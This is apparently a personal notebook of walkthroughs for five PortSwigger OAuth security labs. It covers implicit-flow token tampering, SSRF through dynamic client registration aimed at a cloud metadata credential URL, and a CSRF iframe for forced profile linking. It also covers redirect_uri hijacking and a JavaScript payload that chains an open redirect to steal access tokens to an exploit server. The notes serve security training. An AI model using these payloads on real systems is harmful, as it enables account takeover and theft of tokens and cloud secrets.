---
created: 2026-06-02
---
| `#`  | Solved? | Name                                              | Date    | Notes                      |
| ---- | ------- | ------------------------------------------------- | ------- | -------------------------- |
| `1.` | `✓`     | Authentication bypass via OAuth implicit flow     | `02.06` |                            |
| `2.` | *`✓`*   | SSRF via OpenID dynamic client registration       | `03.06` | #Collaborator<br>#revision |
| `3.` | `✓`     | Forced OAuth profile linking                      | `02.06` |                            |
| `4.` | `✓`     | OAuth account hijacking via `redirect_uri`        | `02.06` |                            |
| `5.` | `✓`     | Stealing OAuth access tokens via an open redirect | `03.06` |                            |

## 1. Authentication bypass via OAuth implicit flow

>[!done]

>[!note]+ Lab description
> - [`Lab: Authentication bypass via OAuth implicit flow`](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
> - Level: #Apprentice 
> 
> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.
> 
> To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.
> 
> You can log in with your own social media account using the following credentials: `wiener:peter`.

### Solution

- Log in as `wiener` using SSO and record the traffic.
- Here is what happens step by step:

1. You go to `/my-account`, and the application redirects you to `/social-login`:

![[images/walkthrough/PortSwigger/OAuth/lab1/1.png]]

2. Your browser makes a `GET` request to `/social-login`, and the application redirects you to the OAuth provider using JavaScript:

![[images/walkthrough/PortSwigger/OAuth/lab1/2.png]]

3. Your application makes a request to the `/auth` endpoint on the authorization server:

```http
GET /auth?client_id=vqqdo7zfs1lz6eair7of3&redirect_uri=https://0ab000a104f66839805d03b400ce0050.web-security-academy.net/oauth-callback&response_type=token&nonce=-1870464970&scope=openid%20profile%20email
```

- `response_type=token` indicates an Implicit Grant type.

![[images/walkthrough/PortSwigger/OAuth/lab1/3.png]]


4. The application redirects you to `/interaction/<code>` where you inter your social media credentials (not credentials of the client app):

![[images/walkthrough/PortSwigger/OAuth/lab1/4.png]]

5. Submitting credentials triggers a `POST` request. Credentials are valid, and the application redirects you again to the consent page.

![[images/walkthrough/PortSwigger/OAuth/lab1/5.png]]

6. On the consent page, the provider lists the scopes the client requests. 

![[images/walkthrough/PortSwigger/OAuth/lab1/6.png]]

7. You consent, then the application issues an access token and redirects you back to the `redirect_uri` of the client:

![[images/walkthrough/PortSwigger/OAuth/lab1/7.png]]

8. The application then uses that to request your data from the resource server (`GET` to `/me`):

![[images/walkthrough/PortSwigger/OAuth/lab1/8.png]]

9. And sends a `POST` request to itself with your data and the access token:

![[images/walkthrough/PortSwigger/OAuth/lab1/9.png]]

- After that `POST`, the application authenticates you (issues the `session` cookie, `Set-Cookie`).
- The problems occur when the application doesn't verify the token actually belongs to `wiener`. 

---

- Log out and repeat the process with interception on. Just do the same, but stop on the last request where you have already gotten a valid token but the application hasn't yet sent it to the backend. Change the username to `carlos` and email to `carlos@carlos-montoya.net`:

![[images/walkthrough/PortSwigger/OAuth/lab1/10.png]]

- Send the request and turn off the proxy. 
- The application logs you in as `carlos`.

![[images/walkthrough/PortSwigger/OAuth/lab1/solved.png]]

Solved!
## 2. SSRF via OpenID dynamic client registration

>[!warning] #Collaborator  Burp Collaborator (Professional Edition) is required to solve this lab.

>[!attention] Needs #revision. 

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: SSRF via OpenID dynamic client registration`](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)
> - Level: #Practitioner 
> 
> 
> This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
> 
> To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Log in as `wiener`. The flow looks like this:

![[images/walkthrough/PortSwigger/OAuth/lab2/1.png]]

- Notice `openid` in the requested scopes. 
- Request the discovery document at `/.well-known/openid-configuration` of the OAuth server. 

```http
/.well-known/openid-configuration
```

![[images/walkthrough/PortSwigger/OAuth/lab2/2.png]]

- Inspect the specification:

```JSON
{"authorization_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/auth","claims_parameter_supported":false,"claims_supported":["sub","name","email","email_verified","sid","auth_time","iss"],"code_challenge_methods_supported":["S256"],"end_session_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/session/end","grant_types_supported":["authorization_code","refresh_token"],"id_token_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"issuer":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net","jwks_uri":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/jwks","registration_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/reg","response_modes_supported":["form_post","fragment","query"],"response_types_supported":["code"],"scopes_supported":["openid","offline_access","profile","email"],"subject_types_supported":["public"],"token_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"token_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"token_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/token","request_object_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"request_parameter_supported":false,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"userinfo_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/me","userinfo_signing_alg_values_supported":["HS256","ES256","EdDSA","PS256","RS256"],"introspection_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/token/introspection","introspection_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"introspection_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"revocation_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/token/revocation","revocation_endpoint_auth_methods_supported":["none","client_secret_basic","client_secret_jwt","client_secret_post","private_key_jwt"],"revocation_endpoint_auth_signing_alg_values_supported":["HS256","RS256","PS256","ES256","EdDSA"],"claim_types_supported":["normal"]}
```

- Notice the registration endpoint:

```JSON
"registration_endpoint":"https://oauth-0a23004d04c0bdea800601c202840042.oauth-server.net/reg",
```

- In `Repeater`, construct a `POST` request:

```http
POST /reg HTTP/2
Host: oauth-0a23004d04c0bdea800601c202840042.oauth-server.net
Accept: application/json
Content-Type: application/json
Content-Length: 67
```
```json
{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```

- The application responds with `201 Created`:

![[images/walkthrough/PortSwigger/OAuth/lab2/3.png]]


- Audit the OAuth flow again and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. 
- We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.

![[images/walkthrough/PortSwigger/OAuth/lab2/4.png]]

- In Repeater, go back to the `POST /reg` request that you created earlier. Add the `logo_uri` property with your Collaborator domain:

```http
POST /reg HTTP/2
Host: oauth-0a23004d04c0bdea800601c202840042.oauth-server.net
Accept: application/json
Content-Type: application/json
Content-Length: 141
```
```JSON
{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://gzjsmdxv8zbkviytqgy6hl0q5hb8zzno.oastify.com"
}
```

![[images/walkthrough/PortSwigger/OAuth/lab2/5.png]]

- Copy the `client_id` in the response, and to go `GET /client/CLIENT_ID/logo`:

![[images/walkthrough/PortSwigger/OAuth/lab2/6.png]]

- See that it contains a unique response from collaborator.
- Go back to the `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL:

```json
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
```

![[images/walkthrough/PortSwigger/OAuth/lab2/7.png]]

- Go back to the `GET /client/CLIENT-ID/logo` request and replace the `client_id` with the new one from the response you've got:

![[images/walkthrough/PortSwigger/OAuth/lab2/8.png]]

- Submit the `SecretAccessKey` as a solution.

![[images/walkthrough/PortSwigger/OAuth/lab2/solved.png]]


Solved!
## 3. Forced OAuth profile linking

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Forced OAuth profile linking`](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
> - Level: #Practitioner 
> 
> This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.
> 
> To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.
> 
> The admin user will open anything you send from the exploit server and they always have an active session on the blog website.
> 
> You can log in to your own accounts using the following credentials:
> 
> - Blog website account: `wiener:peter`
> - Social media profile: `peter.wiener:hotdog`

### Solution

- Log in as `wiener` without using a social media profile.

![[images/walkthrough/PortSwigger/OAuth/lab3/1.png]]

![[images/walkthrough/PortSwigger/OAuth/lab3/2.png]]

- On the page, click `Attack a social profile`.

![[images/walkthrough/PortSwigger/OAuth/lab3/3.png]]

- Log in using social media credentials, give consent for delegated access, and click `Continue`. 
- Log out and `Login with social media`. Observe you don't have to enter credentials again this time, since you already have an authenticated session with the social media platform.
- In Burp proxy, the flow looks like this:

![[images/walkthrough/PortSwigger/OAuth/lab3/4.png]]

- On the picture:
	- Green: Initial login.
	- Orange: Social profile linking — authorization server (social media platform). 
	- Violet: Social profile linking — client application.
	- Yellow: Logging in with social media.

- Notice the initial request that starts the profile linking (the first orange `GET` from the bottom):

```HTTP
GET /auth?client_id=t8bru34yvgczmqfo00x9y&redirect_uri=https://0a3b00b503898792809613eb00a7001f.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email
```

- No `state` in the callback either:

![[images/walkthrough/PortSwigger/OAuth/lab3/5.png]]

- There is no `state` parameter at all. This means a CSRF is possible.
- The violet URL is what you need to deliver to victim.

---

- Start the profile linking process again with the `Intercept` on. Forward any request until you get `GET /oauth-linking?code=...`. Copy the URL.

![[images/walkthrough/PortSwigger/OAuth/lab3/6.png]]

- Drop the request.
- Turn off proxy interception and log out of the blog website.
- Go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied:

```html
<iframe src="https://0a3b00b503898792809613eb00a7001f.web-security-academy.net/oauth-linking?code=7IGFJzUK-wAtODYtHebKZez1lxcvE6mhj-8eo85O5cK"></iframe>
```

![[images/walkthrough/PortSwigger/OAuth/lab3/7.png]]

- `Store` and `Deliver exploit to victim`.
- Then go back to the blog website and select the "Log in with social media" option again. You are instantly logged in as the admin user:

![[images/walkthrough/PortSwigger/OAuth/lab3/8.png]]

- Go to the admin panel and delete the `carlos` user:

![[images/walkthrough/PortSwigger/OAuth/lab3/solved.png]]

Solved!
## 4. OAuth account hijacking via `redirect_uri`

>[!done]

>[!note]+ Lab description
> - [`Lab: OAuth account hijacking via redirect_uri`](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
> - Level: #Practitioner 
> 
> This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
> 
> To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.
> 
> The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
> 
> You can log in with your own social media account using the following credentials: `wiener:peter`.

### Solution

- Log in as `wiener` using your social media account, and record all the traffic.
- The flow looks like this:

![[images/walkthrough/PortSwigger/OAuth/lab4/1.png]]

- See the authorization accepts the request and proceeds to the authentication flow:

![[images/walkthrough/PortSwigger/OAuth/lab4/2.png]]

- Construct the exploit:

```html
<script>
window.location="https://oauth-0a18004604dcb66a82be8219025c003f.oauth-server.net/auth?client_id=fv3fc80mco5dbcbno5zxm&redirect_uri=https://exploit-0a9500a10480b642821a83a90141007f.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"
</script>
```

![[images/walkthrough/PortSwigger/OAuth/lab4/3.png]]

- `Store` and `Deliver exploit to victim`. 
- Go to access log and see the code:

![[images/walkthrough/PortSwigger/OAuth/lab4/4.png]]

- Copy the last request in the authentication flow and change the code (I did this in Incognito):

```
https://0adc00340458b66882e284df000b0035.web-security-academy.net/oauth-callback?code=FvkewyUA59DIK9KPXBiQBk8rpisbCxTaK9W2siP3_H9
```

![[images/walkthrough/PortSwigger/OAuth/lab4/5.png]]

- See you are logged in as an administrator. 
- Go to the admin panel and delete `carlos`.

![[images/walkthrough/PortSwigger/OAuth/lab4/solved.png]]

Solved!
## 5. Stealing OAuth access tokens via an open redirect

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Stealing OAuth access tokens via an open redirect`](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
> 
> This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
> 
> To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
> 
> 
>>[!note] You cannot access the admin's API key by simply logging in to their account on the client application.
> 
> The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
> 
> You can log in via your own social media account using the following credentials: `wiener:peter`.

### Solution

- Log in as `wiener` using your social media account. 
- The flow looks like this:

![[images/walkthrough/PortSwigger/OAuth/lab5/1.png]]

- Send the first `GET` to the authorization server to `Repeater` and change the `redirect_uri` to your exploit server. 
- This time, the authorization server validates the URL:

![[images/walkthrough/PortSwigger/OAuth/lab5/2.png]]

- It might be possible to bypass this using open redirect.
- Browse the application. Find a `302` redirect is triggered when you click `Next post` button under any blog post. The `Location` parameter contains the value of the `path` URL parameter:

![[images/walkthrough/PortSwigger/OAuth/lab5/3.png]]

- Send this request to repeater and replace the parameter to your exploit URL:

![[images/walkthrough/PortSwigger/OAuth/lab5/4.png]]

- The application does redirects to your server. Copy the URL of this request and paste it as a value of the `redirect_uri` parameter of the OAuth authorization request:

```
redirect_uri=https://0abf006504c3fb20805017dc004a001a.web-security-academy.net/post/next?path=https://exploit-0a8300ad0488fb55807416dc01f600b5.exploit-server.net/
```

![[images/walkthrough/PortSwigger/OAuth/lab5/5.png]]

- Still an error. Preserve the original `oauth-callback` parameter and use path traversal to get back to the `/post/next` page:

```
redirect_uri=https://0abf006504c3fb20805017dc004a001a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8300ad0488fb55807416dc01f600b5.exploit-server.net/exploit
```

![[images/walkthrough/PortSwigger/OAuth/lab5/6.png]]

- The URL passes the validation. 
- Visit that URL in the browser and see you are redirected to `Hello, world!` at your exploit server:
- Since this is Implicit Grant, construct an exploit that captures the fragment:

```html
	<script>	
		// no hash -> first visit; trigger the OAuth flow with redirect_uri pointing at this page
		if (!document.location.hash) {
		
		// first visit: initiate the OAuth flow, point redirect_uri at this page
		window.location = 'https://oauth-0ae400ae048dfbfa8048157e02d10079.oauth-server.net/auth?client_id=zsqtpt60nmv4y6tlhow7j&redirect_uri=https://0abf006504c3fb20805017dc004a001a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8300ad0488fb55807416dc01f600b5.exploit-server.net/exploit&response_type=token&nonce=176780987&scope=openid%20profile%20emai'
		} else {
			// hash present -> second redirect; the token is already captured in access log
			// to capture explicitly:
			window.location = '/capture?' + document.location.hash.substr(1);
		}

	</script>
```

![[images/walkthrough/PortSwigger/OAuth/lab5/7.png]]


- `Store` and `Deliver exploit to victim`. 
- Capture the access token:

![[images/walkthrough/PortSwigger/OAuth/lab5/8.png]]


- Send `GET` to `/me` to `Repeater` and replace the token in the `Authorization: Bearer` header to the one you just captured:

![[images/walkthrough/PortSwigger/OAuth/lab5/9.png]]

- This gives you the API key. Copy it and paste as a solution.

![[images/walkthrough/PortSwigger/OAuth/lab5/solved.png]]

Solved!